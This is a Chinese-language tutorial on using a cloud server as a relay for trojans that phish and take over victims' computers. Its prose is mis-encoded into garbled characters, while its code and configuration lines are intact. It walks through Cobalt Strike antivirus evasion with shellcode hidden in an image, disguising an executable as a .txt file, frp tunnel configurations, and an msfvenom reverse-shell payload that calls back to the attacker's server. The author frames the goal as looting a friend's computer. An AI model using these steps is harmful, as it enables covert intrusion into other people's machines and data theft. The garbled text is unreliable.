# äº‘æœåŠ¡å™¨åšä»£ç†é’“é±¼è¿›å†›å†…ç½‘

Authorï¼šbadbird

Timeï¼š2021-5--ä¸è¯¦

---

### 0x01 å‰è¨€

â€‹		ä»å¾ˆä¹…ä¹‹å‰å› ä¸ºIPV4å¿«ä¸å¤Ÿåˆ†äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å®¶åº­å®½å¸¦éƒ½ä¸ç»™åˆ†é…å…¬ç½‘IPäº†ï¼Œæ­£å¸¸ç™¾åº¦æŸ¥æœ¬æœºIPæŸ¥åˆ°çš„éƒ½æ˜¯å½“å‰åŒºåŸŸçš„æŸä¸ªèŠ‚ç‚¹çš„IPï¼Œè€Œä¸æ˜¯æˆ‘ä»¬è‡ªå·±ç›´æ¥è¿æ¥åˆ°äº’è”ç½‘ä¸Šçš„å…¬ç½‘IPã€‚æ‰€ä»¥ï¼Œå½“æˆ‘ä»¬æƒ³é€šè¿‡ğŸæ§åˆ¶æœ‹å‹çš„ç”µè„‘æœåˆ®ä»–çš„èµ„æºæ—¶å°±ä¼šå‘ç°ğŸçš„å›è¿IPå¡«äº†è‡ªå·±ç™¾åº¦çš„æœ¬æœºIPï¼Œï¼ˆç”šè‡³æœ‰çš„å°ç™½ä¼šå¡«å…¥è‡ªå·±çš„å±€åŸŸç½‘IP192.168.x.xï¼Œè¿™ç§åªé€‚ç”¨äºå±€åŸŸç½‘ï¼Œæ¯”å¦‚æ§åˆ¶ä½ éš”å£æ¡Œçš„å°ä¼™ä¼´ï¼Œå¹¶ä¸èƒ½è¿›å†›åˆ°å…¬ç½‘ï¼‰å¹¶ä¸èƒ½è¿æ¥åˆ°è‡ªå·±çš„ç”µè„‘ä¸Šï¼ŒåŸå› å°±æ˜¯ä¸Šé¢è®²çš„é‚£æ ·ã€‚

â€‹		æœ¬æ–‡æ—¨åœ¨ä¸€ç«™åˆ°åº•å¼æ•™ä¼šå¤§å®¶å¦‚ä½•åˆ©ç”¨äº‘æœåŠ¡å™¨åšè‡ªå·±çš„â€œå…¬ç½‘IPâ€ï¼Œè®©ğŸå‘æœ‰å…¬ç½‘IPçš„äº‘æœåŠ¡å™¨å»ºç«‹è¿æ¥ï¼Œå†é€šè¿‡ç«¯å£è½¬å‘è¿æ¥åˆ°è‡ªå·±çš„ç”µè„‘ä¸Šã€‚æ–‡ä¸­æ¶‰åŠåˆ°çš„æ‰‹æ³•å¹¶ä¸å”¯ä¸€ï¼Œä¹Ÿä¸ä¸€å®šè€ƒè™‘çš„å…¨é¢ï¼Œä½†èƒ½ä¿è¯æ˜¯çœŸå®æœ‰æ•ˆçš„ã€‚

---

æ“ä½œç¯å¢ƒï¼š

- ä¸€å°Centos7äº‘æœåŠ¡å™¨
- kali2020ï¼Œè£…æœ‰CS
- Win10é¶æœº

---

### 0x02 è‡ªå·±çš„äº‘æœåŠ¡å™¨

â€‹		æˆ‘ä¹°çš„æ˜¯æŸäº‘çš„è½»é‡çº§åº”ç”¨æœåŠ¡å™¨ï¼Œæ€§ä»·æ¯”ç®—å·®ä¸å¤šçš„ä¸€å¹´ä¸åˆ°100å—é’±ã€‚

![image-20210507102158327](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210507102158327.png)

äº‘æœåŠ¡å™¨è¿˜å¯ä»¥åšä¸€äº›åˆ«çš„äº‹æƒ…æ¯”å¦‚æ­ç½‘ç«™ï¼Œè‡ªå·±çš„åšå®¢ï¼Œç§äººç½‘ç›˜ç­‰ç­‰ã€‚ä¹°æ¥çš„äº‘æœåŠ¡å™¨éƒ½ä¼šæœ‰ä¸€ä¸ªå…¬ç½‘IPï¼Œåœ¨æ§åˆ¶å°å¯ä»¥çœ‹åˆ°

![image-20210507102615198](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210507102615198.png)

æ¥ä¸‹æ¥å¯ä»¥è¿›å»ç©è€ç©è€ï¼Œæˆ–è€…æ¥ç€å¾€ä¸‹åšï¼Œå¦‚ä½•é…ç½®ä»£ç†åœ¨0x05

### 0x03 CSå…æ€

â€‹		ä¸ºä»€ä¹ˆæ˜¯CSå…æ€å‘¢ï¼Ÿå› ä¸ºç”¨è¿‡å¤§ä½¬ç°æˆçš„CSå…æ€å¤„ç†çš„è„šæœ¬ï¼šhttps://github.com/Gality369/CS-Loaderã€‚å¦‚æœä¼šMSFå…æ€çš„è¯ï¼Œå°±ä¸ç”¨å†CSè”åŠ¨MSFäº†ï¼Œç›´æ¥ä¸ŠMSFå°±è¡Œï¼Œå› ä¸ºMSFåœ¨å†…ç½‘æ¸—é€æ–¹é¢æ˜¯å¾ˆå¥½çš„é€‰æ‹©ï¼Œæœ‰åˆ©äºä¸‹ä¸€æ­¥æ“ä½œã€‚æ¥ä¸‹æ¥æŒ‰ç…§Readmeçš„æ­¥éª¤åšä¸€éï¼Œæˆ‘é€‰æ‹©çš„æ˜¯goç‰ˆæœ¬ï¼ˆå“ªä¸ªç‰ˆæœ¬éƒ½æ— æ‰€è°“ï¼Œç¼–ç¨‹è¯­è¨€åªæ˜¯ä¸€ç§å·¥å…·ï¼Œç”¨å“ªä¸ªç‰ˆæœ¬è¦ç¡®ä¿æœ‰è¯¥è¯­è¨€çš„ç¯å¢ƒå°±è¡Œã€‚ï¼‰

```go
git clone https://github.com/Gality369/CS-Loader.git
```

å…‹éš†è¿™ä¸ªé¡¹ç›®åˆ°kaliæœ¬åœ°ï¼Œcdè¿›å…¥è¯¥ç›®å½•ï¼š
![image-20210507103838713](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210507103838713.png)

ç¬¬ä¸€æ­¥ï¼šå°†ä¸€å¼ ä¸è¦å¤ªå¤§çš„å›¾ç‰‡æ”¾å…¥åŒä¸€æ–‡ä»¶å¤¹ä¸‹

ç¡®å®æ˜¯ä¸è¦å¤ªå¤§ï¼Œç™¾åº¦äº†å¥½å‡ å¼ å›¾ç‰‡ï¼Œæ‰¾åˆ°ä¸€ä¸ªèƒ½ç”¨çš„ï¼ˆå½¢è±¡â‘§ï¼‰ï¼š

![ma](C:\Users\King\Desktop\ma.jpg)

ç¬¬äºŒæ­¥ï¼Œå°†ç”Ÿæˆçš„shellcodeå¡«å…¥generator.pyçš„shellcodeä¸­ï¼Œç”Ÿæˆæºå¸¦åŠ å¯†æ··æ·†åçš„shellcodeçš„å›¾ç‰‡ã€‚

é¦–å…ˆCSå»ºç«‹ä¸€ä¸ªç›‘å¬ï¼Œç‚¹å‡»è¿™ä¸ªè€³æœºæŒ‰é’®ï¼š

![image-20210507105303633](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210507105303633.png)

Nameéšä¾¿ï¼Œå…¶ä»–çš„é»˜è®¤å³å¯ï¼Œç«¯å£ä¸è¦å†²çªäº†å°±è¡Œã€‚

![image-20210507105219218](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210507105219218.png)

ç„¶åç”Ÿæˆshellcodeï¼š

![image-20210507105031175](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210507105031175.png)

é€‰æ‹©åˆšæ‰å»ºç«‹çš„httpçš„ç›‘å¬ï¼Œå‹¾é€‰x64ï¼š

![image-20210507114406867](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210507114406867.png)

ç‚¹å‡»ç”Ÿæˆï¼Œé€‰æ‹©ä¸€ä¸ªä¿å­˜çš„ä½ç½®ï¼ˆå“ªé‡Œéƒ½è¡Œï¼‰ï¼Œç”¨æ–‡æœ¬æŸ¥çœ‹å™¨æ‰“å¼€è¿™ä¸ª.cæ–‡ä»¶ï¼š

![image-20210507114441577](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210507114441577.png)

åŒå¼•å·å†…çš„å°±æ˜¯shellcodeã€‚

å°†shellcodeå¡«å…¥generator.pyçš„shellcodeå˜é‡ä¸­ï¼Œå°±å¤åˆ¶ç²˜è´´å°±è¡Œï¼š

![image-20210507114510200](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210507114510200.png)

ä¿å­˜ï¼Œç”¨**python2**æ‰§è¡Œ

```
python generator YourRC4key ImageName
```

YourRC4keyä»»æ„å³å¯ï¼š

![image-20210507110440884](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210507110440884.png)

ç¬¬ä¸‰æ­¥ï¼Œå°†å›¾ç‰‡ä¸Šä¼ è‡³https://imgtu.com/ï¼Œå¤åˆ¶å›¾ç‰‡é“¾æ¥ï¼š

![image-20210507114747836](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210507114747836.png)

ç¬¬å››æ­¥ï¼Œä¿®æ”¹CS-Loader.goï¼Œåœ¨å“åº”ä½ç½®å¡«å…¥å›¾ç‰‡urlå’Œä¹‹å‰çš„RC4key:

![image-20210507114838570](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210507114838570.png)

ç¬¬äº”æ­¥ï¼Œç¼–è¯‘CS-Loader.goç”Ÿæˆexeæ–‡ä»¶ï¼ˆå¦‚æœç¼–è¯‘å¤±è´¥ç™¾åº¦ä¸€ä¸‹goçš„äº¤å‰ç¼–è¯‘ï¼‰ï¼š

```shell
CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -ldflags="-H windowsgui" CS-Loader.go

#å¤§æ¦‚è§£é‡Šä¸€ä¸‹ï¼Œå‰é¢çš„é€‰é¡¹æŒ‡åè¦ç”Ÿæˆ64ä½æ¶æ„çš„windowsç³»ç»Ÿä¸Šçš„ç¨‹åºï¼Œ-ldflagsé€‰é¡¹ä½¿åº”ç”¨ç¨‹åºè¿è¡Œæ—¶ä¸æ˜¾ç¤ºé»‘çª—å£ã€‚
```

![image-20210507121148999](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210507121148999.png)

ç”Ÿæˆäº†exeï¼Œå…ˆæ¥æµ‹è¯•ä¸€ä¸‹æ˜¯å¦å¯ç”¨ï¼š

![image-20210507121134786](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210507121134786.png)

è«æœ‰é—®é¢˜ï¼Œï¼Œ**ï¼ˆç»•çš„è¿‡360å’Œç«ç»’å´è¢«Windows DefenderæŸ¥å‡ºæ¥ï¼Ÿï¼‰**

### 0x04 é’“é±¼æ‰‹æ³•-ä¼ªè£…

- icoæ›¿æ¢ï¼Œä½¿ç”¨resource_hackerå·¥å…·ï¼Œwin10æ‰€æœ‰icoï¼š

  é“¾æ¥ï¼šhttps://pan.baidu.com/s/1QzGt2b0rdtsXDyv7Qv-XGA 
  æå–ç ï¼šo0au 

  æ›¿æ¢æ•ˆæœå¦‚ä¸‹ï¼Œ.txtæ˜¯æ–‡ä»¶åï¼Œwindowsé»˜è®¤ä¸æ˜¾ç¤ºåç¼€åï¼Œå®é™…ä¸Šå®ƒè¿˜æ˜¯ä¸ªéšè—äº†.exeåç¼€çš„å¯æ‰§è¡Œç¨‹åºã€‚

![image-20210507133241042](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210507133241042.png)

- ç½‘ç«™æŒ‚é©¬

### 0x05 frpå†…ç½‘ç©¿é€ï¼ˆé‡ç‚¹ï¼‰

**åŸç†ï¼š**

![image-20210516144339607](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210516144339607.png)

åˆ¶ä½œä¸€ä¸ªå›è¿äº‘æœåŠ¡å™¨ï¼ˆproxyï¼‰çš„ğŸï¼Œè¿™æ ·ç¡®ä¿äº†proxyå’Œtargetçš„é€šä¿¡ã€‚

attackerå’Œproxyé€šè¿‡frpå»ºç«‹èµ·tcpè¿æ¥ã€‚

åˆ©ç”¨frpåœ¨proxyä¸Šè¿›è¡Œç«¯å£è½¬å‘ï¼Œå°†proxyä¸targetå»ºç«‹çš„é€šä¿¡ç«¯å£æ¥æ”¶çš„ä¿¡æ¯è½¬å‘ç»™attackerçš„æŸä¸ªç›‘å¬ç«¯å£ã€‚

#### **[ä»¥msfæœ¨é©¬ä¸ºä¾‹]**

- https://github.com/fatedier/frp/releasesåˆ°è¿™é‡Œä¸‹è½½frpï¼Œå®¢æˆ·ç«¯ï¼ˆä½ è¿è¡Œmsfçš„ä¸»æœºï¼‰å’ŒæœåŠ¡ç«¯ï¼ˆäº‘ä¸»æœºï¼‰éƒ½ä¸‹è½½åŒä¸€ç‰ˆæœ¬çš„ã€‚

æˆ‘ä¸‹è½½çš„æ˜¯frp_0.36.2_linux_amd64.tar.gz

```shell
è§£å‹å‘½ä»¤ï¼š
tar -zxvf frp_0.36.2_linux_amd64.tar.gz
```

ç„¶åå¼€å§‹è¿›å…¥è§£å‹å¥½çš„æ–‡ä»¶å¤¹å†…ï¼Œå¼€å§‹é…ç½®å§ï¼š
**æœåŠ¡ç«¯ frps.ini**ï¼š

```shell
[common]
bind_port = 7000			#æœåŠ¡æ®µfrpæœåŠ¡ç»‘å®šç«¯å£
token = abc123				#ä»¤ç‰Œç ï¼Œå’Œå®¢æˆ·ç«¯è¦ä¸€è‡´

#management
dashboard_port = 7500		#frpç®¡ç†æœåŠ¡çš„ç«¯å£
dashboard_user = admin		#ç®¡ç†ç”¨æˆ·å
dashboard_pwd = admin		#ç®¡ç†å¯†ç 
enable_prometheus = true	#å¯ç”¨æ™®ç½—ç±³ä¿®æ–¯è¿ç»´æœåŠ¡ï¼Œgoè¯­è¨€ç›¸å…³ç›‘æ§ï¼Œå¯ä»¥å…³é—­

#log
log_file = /var/log/frps.log	#æ—¥å¿—è·¯å¾„
log_level = info				#æ—¥å¿—ç­‰çº§
log_max_days = 3

#port_white
allow_ports = 7000,7500			#ç™½åå•ï¼Œä¸Šè¾¹é…ç½®äº†å“ªä¸ªç«¯å£è¿™é‡Œè¦åŠ ä¸Š
```

**å®¢æˆ·ç«¯ frpc.ini**ï¼š

```shell
[common]
server_addr = 39.106.83.5		#äº‘æœåŠ¡å™¨çš„å…¬ç½‘IP
server_port = 7000				#æœåŠ¡ç«¯frpæœåŠ¡ç»‘å®šçš„ç«¯å£
token = abc123					#ä»¤ç‰Œç ï¼Œå’ŒæœåŠ¡ç«¯è¦ä¸€è‡´

[ssh]	#[]æ‹¬èµ·æ¥ä¸ºæ¯ä¸ªç¨‹åºçš„é…ç½®ï¼Œè¿™ä¸ªæ˜¯ä¸ºsshé…ç½®çš„ï¼Œä¸¾ä¸ªä¾‹å­ã€‚
type = tcp
local_ip = x.x.x.x
local_port = 22
remote_port = 1234

[msf]	#ä¸ºmsfæœ¨é©¬å›è¿é…ç½®çš„ä»£ç†
type = tcp						#tcpè¿æ¥ï¼Œhandlerçš„payloadä¹Ÿè®°å¾—è®¾ç½®æˆreverse_tcp
local_ip = kaliçš„å±€åŸŸç½‘ip
local_port = 6666				#msfconsoleçš„handlerä¸­è®¾ç½®çš„lport
remote_port = 6767				#msfvenomç”Ÿæˆæœ¨é©¬æ—¶å†™çš„ç›‘å¬ç«¯å£
```

**msfvenomç”Ÿæˆæœ¨é©¬**

```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=æœåŠ¡å™¨IP lport=frpc.inié…ç½®çš„remote_port -f exe -o test.exe
```

#### **[ä»¥CSæœ¨é©¬ä¸ºä¾‹]**

**å› ä¸ºå¯ä»¥åšå…æ€ï¼Œæ‰€ä»¥è¿˜æ˜¯ç”Ÿæˆshellcode**

åŒºåˆ«æ˜¯ç›‘å¬å™¨çš„è®¾ç½®ã€‚è¦æ ¹æ®ä»£ç†çš„åŸç†æ¥é…ç½®ç›‘å¬ï¼šğŸåšçš„äº‹åªæ˜¯è¿æ¥proxyæœåŠ¡å™¨ï¼Œæ‰€ä»¥ç”Ÿæˆshellcodeæ—¶ä¸€å®šè¦æ³¨æ„ç›‘å¬å™¨çš„ip-port

**è¿˜å¯ä»¥æŠŠæœåŠ¡å™¨å½“ä½œteamserver**

CSè¯ç”Ÿæœ¬å°±æ˜¯ä¸ºäº†å›¢é˜Ÿåä½œæ¸—é€çš„ï¼Œç”¨äº‘æœåŠ¡å™¨åšteamserverï¼Œç„¶åå„attackerç«¯å¯åŠ¨CSæ—¶è¿æ¥teamserverè¿™æ ·è¿˜çœå»äº†é…ç½®frpã€‚

### 0x06 CSè”åŠ¨MSF

### 0x07 è¿›å†›å†…ç½‘

